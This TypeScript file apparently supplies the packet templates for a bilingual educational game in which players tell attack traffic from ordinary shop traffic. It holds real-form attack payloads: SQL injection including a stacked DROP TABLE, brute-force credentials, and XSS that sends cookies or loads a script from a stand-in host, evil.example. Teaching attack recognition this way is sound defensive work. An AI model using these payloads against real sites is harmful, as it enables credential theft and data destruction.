// core
import { STUFF_IP } from '../constants';
import type { Chip, PacketTemplate, Template } from '../types';

const BROWSER_WIN = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:141.0) Firefox/141.0';
const BROWSER_IOS = 'User-Agent: Mozilla/5.0 (iPhone) Mobile Safari/19.0';
const BROWSER_MAC = 'User-Agent: Mozilla/5.0 (Macintosh) Firefox/141.0';
const BROWSER_AND = 'User-Agent: Mozilla/5.0 (Android 16) Chrome/140.0';
const BROWSER_CHR = 'User-Agent: Mozilla/5.0 (Windows NT 10.0) Chrome/140.0';
const HOST = 'Host: shop.example';
const JSON_CT = 'Content-Type: application/json';
const FORM_CT = 'Content-Type: application/x-www-form-urlencoded';

const LIST: PacketTemplate[] = [
  // ---------- legit ----------
  { id: 'legit-socks', lane: 2, kind: 'legit', net: 'home', weight: 8, card: 'GET /search?q=blue+wool+socks',
    request: ['GET /search?q=blue+wool+socks HTTP/2', HOST, BROWSER_WIN, 'Accept-Language: es-CO,es;q=0.9'],
    why: { en: 'A shopper looking for socks. Let it through.', es: 'Alguien buscando medias. Déjalo pasar.' } },
  { id: 'legit-oreilly', lane: 2, kind: 'legit', net: 'mobile', weight: 4, card: "GET /search?q=O'Reilly+books",
    request: ["GET /search?q=O'Reilly+books HTTP/2", HOST, BROWSER_IOS, 'Referer: https://shop.example/'],
    why: { en: "A real customer. The apostrophe belongs to a publisher's name. A rule that blocks every ' drops people like this.",
      es: "Un cliente real. El apóstrofo es parte del nombre de una editorial. Una regla que bloquee toda ' deja por fuera a gente como esta." } },
  { id: 'decoy-union', lane: 2, kind: 'legit', decoy: true, net: 'home', weight: 4, card: 'GET /search?q=union+jack+t-shirt',
    request: ['GET /search?q=union+jack+t-shirt HTTP/2', HOST, BROWSER_MAC, 'Referer: https://shop.example/gifts'],
    why: { en: "A shopper after a Union Jack t-shirt. The word union alone isn't SQL: there's no quote to break out of the string.",
      es: 'Alguien buscando una camiseta con la bandera británica. La palabra union sola no es SQL: no hay comilla con la que salirse del texto.' } },
  { id: 'decoy-dropleaf', lane: 2, kind: 'legit', decoy: true, net: 'mobile', weight: 3, card: 'GET /search?q=drop-leaf+table+lamp',
    request: ['GET /search?q=drop-leaf+table+lamp HTTP/2', HOST, BROWSER_AND, 'Referer: https://shop.example/home'],
    why: { en: 'Someone furnishing a small flat. DROP and TABLE, but nothing here closes a string or ends a statement.',
      es: 'Alguien amoblando un apartamento pequeño. DROP y TABLE, pero nada aquí cierra un texto ni termina una sentencia.' } },
  { id: 'legit-rain-jacket', lane: 2, kind: 'legit', net: 'home', weight: 3, card: 'GET /search?q=rain+jacket',
    request: ['GET /search?q=rain+jacket HTTP/2', HOST, BROWSER_CHR, 'Cookie: session=7f3a…'],
    why: { en: 'A shopper with a real browser and a session cookie. During a flood, this is who you are protecting.',
      es: 'Alguien comprando con un navegador real y una cookie de sesión. Durante una inundación, a esta persona es a quien proteges.' } },
  { id: 'legit-login', lane: 1, kind: 'legit', net: 'mobile', weight: 5, card: 'POST /login user=maria.g pass=••••••••',
    request: ['POST /login HTTP/2', HOST, BROWSER_IOS, FORM_CT, '', 'user=maria.g&pass=••••••••'],
    context: { en: 'THIS IP · 1 login today', es: 'ESTA IP · 1 inicio de sesión hoy' },
    why: { en: 'A customer logging in to check an order.', es: 'Alguien entrando a revisar su pedido.' } },
  { id: 'legit-deploy', lane: 0, kind: 'legit', net: 'ci', weight: 4, card: 'SSH-2.0-OpenSSH_9.6 publickey deploy',
    request: ['SSH-2.0-OpenSSH_9.6', 'auth: publickey (ed25519)', 'user: deploy'],
    why: { en: 'Your CI pipeline deploying with its SSH key. Drop it and the release breaks.',
      es: 'Tu pipeline de CI desplegando con su llave SSH. Si lo bloqueas, se rompe el release.' } },
  { id: 'legit-comment', lane: 3, kind: 'legit', net: 'home', weight: 3, card: 'POST /comments "great write-up, thanks!"',
    request: ['POST /comments HTTP/2', HOST, JSON_CT, '', '{"body":"great write-up, thanks!"}'],
    why: { en: 'A happy reader.', es: 'Alguien que disfrutó el post.' } },
  { id: 'legit-comments-page', lane: 3, kind: 'legit', net: 'mobile', weight: 2, card: 'GET /comments?page=2',
    request: ['GET /comments?page=2 HTTP/2', HOST, BROWSER_IOS, 'Cookie: session=c91e…'],
    why: { en: 'A reader paging through comments with a real browser and a session.', es: 'Alguien leyendo comentarios con un navegador real y una sesión.' } },
  { id: 'decoy-script-question', lane: 3, kind: 'legit', decoy: true, net: 'home', weight: 3, card: 'POST /comments "Why does my <script> tag load twice?"',
    request: ['POST /comments HTTP/2', HOST, JSON_CT, '', '{"body":"Why does my <script> tag load twice?"}'],
    why: { en: 'A developer asking a question. It mentions <script> as words, which is harmless if you encode output. A naive filter drops it.',
      es: 'Alguien que programa haciendo una pregunta. Menciona <script> como texto, lo cual es inofensivo si codificas la salida. Un filtro ingenuo lo bloquea.' } },
  { id: 'legit-smtp', lane: 4, kind: 'legit', port: 25, net: 'mail', weight: 3, card: 'SMTP :25 EHLO mail.partner.example',
    request: ['TCP → port 25 (smtp)', 'EHLO mail.partner.example', 'MAIL FROM:<orders@partner.example>'],
    why: { en: "A partner's mail server delivering an email. Port 25 is open on purpose.",
      es: 'El servidor de correo de un aliado entregando un email. El puerto 25 está abierto a propósito.' } },

  // ---------- SQL injection ----------
  { id: 'sqli-tautology', lane: 2, kind: 'sqli', tier: 1, net: 'vps', weight: 9, card: "GET /search?q=' OR 1=1--",
    request: ["GET /search?q=' OR 1=1-- HTTP/1.1", HOST, 'User-Agent: sqlmap/1.8.2#stable', 'Accept: */*'], hints: ["' OR 1=1--", 'sqlmap'],
    why: { en: "Tautology injection. The ' closes the string, OR 1=1 matches every row, and -- comments out the rest of the query.",
      es: "Inyección por tautología. La ' cierra el texto, OR 1=1 coincide con todas las filas y -- comenta el resto de la consulta." } },
  { id: 'sqli-union', lane: 2, kind: 'sqli', tier: 2, net: 'vps', weight: 5, card: "GET /search?q=1' UNION SELECT email,password FROM users--",
    request: ["GET /search?q=1' UNION SELECT email,password FROM users-- HTTP/1.1", HOST, 'User-Agent: Mozilla/5.0', 'Accept: */*'], hints: ['UNION SELECT', 'FROM users--'],
    why: { en: 'UNION-based injection. It glues a second query onto yours and dumps the users table into the search results.',
      es: 'Inyección con UNION. Pega una segunda consulta a la tuya y vuelca la tabla de usuarios en los resultados de búsqueda.' } },
  { id: 'sqli-sleep', lane: 2, kind: 'sqli', tier: 2, net: 'vps', weight: 4, card: "GET /search?q=socks' AND SLEEP(5)-- -",
    request: ["GET /search?q=socks' AND SLEEP(5)-- - HTTP/1.1", HOST, 'User-Agent: Mozilla/5.0'], hints: ["' AND SLEEP(5)-- -"],
    why: { en: 'Time-based blind injection. If the page takes five seconds, the attacker knows the database ran their SQL.',
      es: 'Inyección ciega por tiempo. Si la página tarda cinco segundos, el atacante sabe que la base de datos ejecutó su SQL.' } },
  { id: 'sqli-encoded', lane: 2, kind: 'sqli', tier: 3, net: 'bot', weight: 5, card: 'GET /search?q=%27%20OR%201%3D1--',
    request: ['GET /search?q=%27%20OR%201%3D1-- HTTP/1.1', HOST, 'User-Agent: python-requests/2.32.3'], hints: ['%27%20OR%201%3D1--'], decodedHints: ["' OR 1=1--"],
    why: { en: "The same tautology, URL-encoded: %27 is a quote. A pattern rule looking for ' never sees it, and the server decodes it anyway.",
      es: "La misma tautología, codificada para URL: %27 es una comilla. Una regla que busca ' nunca la ve, y el servidor la decodifica igual." } },
  { id: 'sqli-orderby', lane: 2, kind: 'sqli', tier: 3, orderBy: true, net: 'home', weight: 5, card: 'POST /search {"q":"socks","sort":"price; DROP TABLE orders--"}',
    request: ['POST /search HTTP/2', HOST, BROWSER_CHR, JSON_CT, '', '{"q":"socks","sort":"price; DROP TABLE orders--"}'], hints: ['DROP TABLE orders--'],
    why: { en: 'Stacked-query injection hidden in the sort field. The search term is innocent; the sort value is pasted into ORDER BY, and ; starts a second statement that drops the whole orders table. Column names cannot be bound parameters, so the fix is an allow-list of sort columns.',
      es: 'Inyección de consultas apiladas escondida en el campo de orden. El término de búsqueda es inocente; el valor de orden se pega en ORDER BY, y el ; inicia una segunda sentencia que elimina toda la tabla de pedidos. Los nombres de columna no pueden ser parámetros, así que la solución es una lista permitida de columnas.' } },

  // ---------- brute force ----------
  { id: 'brute-admin', lane: 1, kind: 'brute', tier: 1, net: 'vps', weight: 5, card: 'POST /login user=admin pass=123456',
    request: ['POST /login HTTP/1.1', HOST, 'User-Agent: Mozilla/5.0 (Hydra)', FORM_CT, '', 'user=admin&pass=123456'], hints: ['user=admin', 'Hydra'],
    why: { en: 'Password guessing against the admin account, straight from a leaked-password list.',
      es: 'Intentos de adivinar la contraseña de la cuenta admin, sacados de una lista de contraseñas filtradas.' } },
  { id: 'brute-ssh-root', lane: 0, kind: 'brute', tier: 1, net: 'vps', weight: 5, card: 'SSH-2.0-libssh_0.9.6 root:toor',
    request: ['SSH-2.0-libssh_0.9.6', 'auth: password', 'user: root', 'pass: toor'], hints: ['root:toor', 'auth: password'],
    why: { en: "SSH brute force with default credentials. root/toor was Kali Linux's old default.",
      es: 'Fuerza bruta por SSH con credenciales por defecto. root/toor era la vieja contraseña por defecto de Kali Linux.' } },
  { id: 'brute-spray', lane: 1, kind: 'brute', tier: 2, net: 'bot', weight: 3, card: 'POST /login user=finance pass=Spring2026!',
    request: ['POST /login HTTP/1.1', HOST, 'User-Agent: Mozilla/5.0', FORM_CT, '', 'user=finance&pass=Spring2026!'], hints: ['pass=Spring2026!'],
    why: { en: 'Password spraying: one seasonal password tried against many accounts, slowly, to dodge lockouts.',
      es: 'Password spraying: una contraseña de temporada probada contra muchas cuentas, despacio, para esquivar los bloqueos.' } },
  { id: 'brute-stuffing', lane: 1, kind: 'brute', tier: 3, net: 'bot', fixedSrc: STUFF_IP, weight: 4, card: 'POST /login user=carlos.m@mail.example pass=Carlos1987',
    request: ['POST /login HTTP/2', HOST, BROWSER_CHR, FORM_CT, '', 'user=carlos.m@mail.example&pass=Carlos1987'], hints: ['41', '60 s'],
    context: { en: 'THIS IP · 41 logins in 60 s · 41 different accounts', es: 'ESTA IP · 41 inicios de sesión en 60 s · 41 cuentas distintas' },
    why: { en: 'Credential stuffing: username and password pairs leaked from another site, replayed here. Each request looks like a normal login; the tell is the volume from one IP.',
      es: 'Credential stuffing: pares de usuario y contraseña filtrados de otro sitio, reutilizados aquí. Cada petición parece un inicio de sesión normal; la pista es el volumen desde una sola IP.' } },

  // ---------- XSS ----------
  { id: 'xss-script', lane: 3, kind: 'xss', tier: 1, net: 'vps', weight: 4, card: `POST /comments "<script>fetch('//evil.example/?c='+document.cookie)</script>"`,
    request: ['POST /comments HTTP/1.1', HOST, JSON_CT, '', `{"body":"<script>fetch('//evil.example/?c='+document.cookie)</script>"}`], hints: ['<script>', 'document.cookie'],
    why: { en: "Stored XSS. Every visitor who loads this comment runs the attacker's script, which sends their session cookie to evil.example unless the cookie is HttpOnly.",
      es: 'XSS almacenado. Cada visitante que cargue este comentario ejecuta el script del atacante, que envía su cookie de sesión a evil.example salvo que la cookie sea HttpOnly.' } },
  { id: 'xss-img', lane: 3, kind: 'xss', tier: 2, net: 'bot', weight: 3, card: 'POST /comments "<img src=x onerror=alert(document.domain)>"',
    request: ['POST /comments HTTP/1.1', HOST, JSON_CT, '', '{"body":"<img src=x onerror=alert(document.domain)>"}'], hints: ['onerror=', '<img src=x'],
    why: { en: 'XSS with no <script> tag. The broken image fires onerror, which runs JavaScript. Filters that only look for <script miss it.',
      es: 'XSS sin etiqueta <script>. La imagen rota dispara onerror, que ejecuta JavaScript. Los filtros que solo buscan <script no lo ven.' } },
  { id: 'xss-jslink', lane: 3, kind: 'xss', tier: 3, net: 'home', weight: 3, card: `POST /comments "Loved it! Source: <a href=javascript:import(atob('Ly9ldmlsLmV4YW1wbGUveC5qcw=='))>link</a>"`,
    request: ['POST /comments HTTP/2', HOST, JSON_CT, '', `{"body":"Loved it! Source: <a href=javascript:import(atob('Ly9ldmlsLmV4YW1wbGUveC5qcw=='))>link</a>"}`], hints: ['javascript:', "atob('Ly9ldmlsLmV4YW1wbGUveC5qcw==')"],
    why: { en: 'XSS dressed as a friendly comment: clicking the link runs JavaScript that loads a script from //evil.example/x.js, an address hidden in base64, so neither <script> nor the domain appears in plain text.',
      es: 'XSS disfrazado de comentario amable: al hacer clic, el enlace ejecuta JavaScript que carga un script desde //evil.example/x.js, una dirección escondida en base64, así que ni <script> ni el dominio aparecen en texto plano.' } },

  // ---------- port scans ----------
  { id: 'scan-telnet', lane: 4, kind: 'scan', tier: 1, port: 23, net: 'vps', weight: 4, card: 'SYN → :23 telnet',
    request: ['TCP SYN → port 23 (telnet)', 'flags: S   window: 1024', 'no payload'], hints: ['telnet', 'window: 1024'],
    why: { en: 'Port scan: one probe of many, checking whether telnet is open. Recon before the real attack.',
      es: 'Escaneo de puertos: una sonda de muchas, revisando si telnet está abierto. Reconocimiento antes del ataque real.' } },
  { id: 'scan-smb', lane: 4, kind: 'scan', tier: 1, port: 445, net: 'vps', weight: 2, card: 'SYN → :445 smb',
    request: ['TCP SYN → port 445 (smb)', 'flags: S   window: 1024', 'no payload'], hints: ['smb', 'window: 1024'],
    why: { en: 'Port scan for Windows file sharing: the door WannaCry walked through in 2017.',
      es: 'Escaneo buscando el uso compartido de archivos de Windows: la puerta por la que entró WannaCry en 2017.' } },
  { id: 'scan-rdp', lane: 4, kind: 'scan', tier: 1, port: 3389, net: 'vps', weight: 3, card: 'SYN → :3389 rdp',
    request: ['TCP SYN → port 3389 (rdp)', 'flags: S   window: 1024', 'no payload'], hints: ['rdp', 'window: 1024'],
    why: { en: 'Port scan looking for Windows Remote Desktop, a favourite ransomware entry point.',
      es: 'Escaneo buscando Escritorio Remoto de Windows, una entrada favorita del ransomware.' } },

  // ---------- botnet flood ----------
  { id: 'flood-search', lane: 2, kind: 'flood', tier: 1, net: 'cloud', weight: 4, card: 'GET /search?q=a',
    request: ['GET /search?q=a HTTP/1.1', HOST, 'User-Agent: Go-http-client/1.1'], hints: ['Go-http-client/1.1'],
    why: { en: 'One of thousands of identical requests from a botnet. Each one is harmless; together they take the site down. The tells: no cookies, a scripting library instead of a browser, the same request over and over.',
      es: 'Una de miles de peticiones idénticas de una botnet. Cada una es inofensiva; juntas tumban el sitio. Las pistas: sin cookies, una librería de scripts en vez de un navegador, la misma petición una y otra vez.' } },
  { id: 'flood-comments', lane: 3, kind: 'flood', tier: 1, net: 'cloud', weight: 3, card: 'GET /comments',
    request: ['GET /comments HTTP/1.1', HOST, 'User-Agent: '], hints: ['User-Agent: '],
    why: { en: 'A botnet hammering the comments page with an empty User-Agent. The volume is the attack.',
      es: 'Una botnet martillando la página de comentarios con un User-Agent vacío. El volumen es el ataque.' } },
  { id: 'flood-login', lane: 1, kind: 'flood', tier: 1, net: 'cloud', weight: 3, card: 'GET /login',
    request: ['GET /login HTTP/1.1', HOST, 'User-Agent: curl/8.9.1'], hints: ['curl/8.9.1'],
    why: { en: 'Bots fetching the login page as fast as they can. No person reloads a login page with curl at this rate.',
      es: 'Bots pidiendo la página de inicio de sesión tan rápido como pueden. Ninguna persona recarga una página de inicio de sesión con curl a este ritmo.' } },
];

const decode = (s: string): string | undefined => {
  try {
    const d = decodeURIComponent(s);
    return d === s ? undefined : d;
  } catch {
    return undefined;
  }
};

// The card's request line, split for the chip layout: the method or protocol, the path or port, and only the payload.
// A path is one lowercase segment; any other shape falls through to the plain fallback rather than a truncated path.
export const cardParts = (card: string): { chip: Chip; path: string; payload: string } => {
  let m = /^(GET|POST) (\/[a-z]+)(?=[\s?]|$)\??(.*)$/.exec(card);
  if (m) return { chip: m[1] as Chip, path: m[2], payload: m[3].trim() };
  m = /^SSH-2\.0-(.*)$/.exec(card);
  if (m) return { chip: 'SSH', path: ':22', payload: m[1] };
  m = /^SYN → (:\d+) (.*)$/.exec(card);
  if (m) return { chip: 'TCP', path: `SYN ${m[1]}`, payload: `→ ${m[2]}` };
  m = /^SMTP (:\d+) (.*)$/.exec(card);
  if (m) return { chip: 'SMTP', path: m[1], payload: m[2] };
  return { chip: 'TCP', path: '', payload: card };
};

export const TEMPLATES: readonly Template[] = LIST.map((t) => {
  const decoded = decode(t.card);
  // The lens swaps the card's payload line alone, so the decoded line is split here once, not at paint time.
  return { ...t, raw: t.request.join('\n'), decoded, decodedPayload: decoded && cardParts(decoded).payload, ...cardParts(t.card) };
});

export const templateById = (id: string): Template => {
  const t = TEMPLATES.find((x) => x.id === id);
  if (!t) throw new Error(`unknown packet template ${id}`);
  return t;
};
